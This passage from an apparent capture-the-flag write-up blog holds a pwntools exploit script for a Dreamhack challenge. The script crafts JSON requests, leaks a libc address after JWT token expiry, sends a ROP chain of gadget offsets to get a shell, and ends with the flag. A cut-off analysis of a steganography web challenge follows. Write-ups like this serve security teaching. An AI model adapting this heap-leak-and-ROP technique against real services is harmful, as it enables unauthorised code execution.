</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>],<span style="color:#a6e22e">list</span>)<span style="color:#f92672">:</span>   
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>.<span style="color:#a6e22e">encode</span>()
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">it</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;[&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">k</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object</span>[<span style="color:#a6e22e">it</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">k</span>, <span style="color:#66d9ef">int</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">val</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">k</span>).<span style="color:#a6e22e">encode</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;,&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">val</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">encode</span>() <span style="color:#f92672">+</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34;,&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">val</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;]&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#34; : &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">val</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;unsupported type&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">l</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;,&#39;</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">email</span>, <span style="color:#a6e22e">car</span>, <span style="color:#a6e22e">vin</span>, <span style="color:#a6e22e">company</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;register&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;args&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">username</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;email&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">email</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Car&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">car</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;VIN&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">vin</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Company&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">company</span>,
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">max</span> <span style="color:#a6e22e">vin</span> <span style="color:#ae81ff">0x11</span>,<span style="color:#a6e22e">username</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">login</span>(<span style="color:#a6e22e">token</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;login&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;args&#39;</span> <span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;token&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">token_status</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;token_status&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">play</span>()<span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;play&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">logout</span>(<span style="color:#a6e22e">token</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;logout&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;args&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;token&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">update</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;logout&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;args&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;token&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">upload</span>(<span style="color:#a6e22e">data</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">list</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;header&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;upload&#39;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;args&#39;</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;idx&#39;</span><span style="color:#f92672">:</span>[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>],
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dump</span>(<span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">__name__</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>(<span style="color:#e6db74">&#39;./sonofthec&#39;</span>,<span style="color:#a6e22e">env</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;LD_PRELOAD&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;./libc.so.6&#39;</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remote</span>(<span style="color:#e6db74">&#39;host3.dreamhack.games&#39;</span>,<span style="color:#ae81ff">8303</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;asdf&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;morning&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x11</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Dreamhack&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">company</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">Dreamhack</span> <span style="color:#a6e22e">exception</span> <span style="color:#a6e22e">raised</span>.
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">loads</span>(<span style="color:#a6e22e">rvl</span>()[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tok</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rv</span>[<span style="color:#e6db74">&#39;token&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;asdf&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;morning&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x11</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Dreamhack&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">loads</span>(<span style="color:#a6e22e">rvl</span>()[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tok</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rv</span>[<span style="color:#e6db74">&#39;token&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;asdf&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;morning&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x11</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;Dreamhack&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">loads</span>(<span style="color:#a6e22e">rvl</span>()[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">tok</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rv</span>[<span style="color:#e6db74">&#39;token&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">login</span>(<span style="color:#a6e22e">tok</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">\#</span><span style="color:#a6e22e">leak</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">success</span>(<span style="color:#e6db74">&#34;sleeping 30s&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">30</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">success</span>(<span style="color:#e6db74">&#39;now token is expired memleak.&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">token_status</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">log_level</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rvu</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rvl</span>()[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">ljust</span>(<span style="color:#ae81ff">8</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\x00&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x219df0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">libc_base</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">exp</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span><span style="color:#a6e22e">sec</span>, <span style="color:#a6e22e">so</span> <span style="color:#a6e22e">exception</span> <span style="color:#a6e22e">will</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">raised</span> <span style="color:#a6e22e">after</span> <span style="color:#ae81ff">30</span><span style="color:#a6e22e">s</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">exception</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">thrown</span> <span style="color:#66d9ef">while</span> <span style="color:#a6e22e">proccessing</span> <span style="color:#a6e22e">JWT</span> <span style="color:#a6e22e">token</span> <span style="color:#a6e22e">validation</span>, <span style="color:#a6e22e">it</span> <span style="color:#a6e22e">traps</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">ptr</span>, <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">global</span> <span style="color:#a6e22e">variable</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">print</span> <span style="color:#a6e22e">things</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">so</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">they</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">print</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">some</span> <span style="color:#a6e22e">memory</span>.
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">because</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">program</span> <span style="color:#a6e22e">frequently</span> <span style="color:#a6e22e">allocates</span> <span style="color:#a6e22e">mem</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">free</span>, <span style="color:#a6e22e">there</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">freed</span> <span style="color:#a6e22e">chunk</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">unsorted</span> <span style="color:#a6e22e">bin</span>, <span style="color:#a6e22e">once</span> <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">reclaim</span> <span style="color:#a6e22e">it</span>, <span style="color:#a6e22e">i</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">libc_base</span>.
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0x11</span> <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#34;1&#34;</span>] <span style="color:#f92672">+</span> [<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> [<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>, <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d8698</span>, <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000029cd6</span>,<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000050d60</span>] 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">upload</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pause</span>() 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sl</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">interactive</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0000</span><span style="color:#a6e22e">C139</span>	.<span style="color:#a6e22e">plt</span>.<span style="color:#a6e22e">sec</span><span style="color:#f92672">:</span><span style="color:#a6e22e">___cxa_throw</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>	<span style="color:#a6e22e">bnd</span> <span style="color:#a6e22e">jmp</span> <span style="color:#a6e22e">cs</span><span style="color:#f92672">:</span><span style="color:#a6e22e">__cxa_throw_ptr</span>	<span style="color:#a6e22e">RAX</span><span style="color:#f92672">=</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">EBCC696A48</span> <span style="color:#a6e22e">RDX</span><span style="color:#f92672">=</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">EBCC683FB8</span> <span style="color:#a6e22e">RSI</span><span style="color:#f92672">=</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">EBCC696A48</span> <span style="color:#a6e22e">RDI</span><span style="color:#f92672">=</span><span style="color:#ae81ff">000055</span><span style="color:#a6e22e">EBCDE23EE0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">KAPO</span>{<span style="color:#a6e22e">js0n_C_w1th_jwt_t0ken_hs_256</span>}
</span></span></code></pre></div><h1 id="online-stego">online stego<a hidden class="anchor" aria-hidden="true" href="#online-stego">#</a></h1>
<h2 id="analysis-1">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/encode&#39;</span>, <span style="color:#a6e22e">methods</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">post_encode</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;png&#39;</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">files</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">form</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">png</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">files</span>[<span style="color:#e6db74">&#39;png&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">msg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">form</span>[<span style="color:#e6db74">&#39;msg&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">validate_extension</span>(<span style="color:#a6e22e">png</span>.<span style="color:#a6e22e">filename</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>)
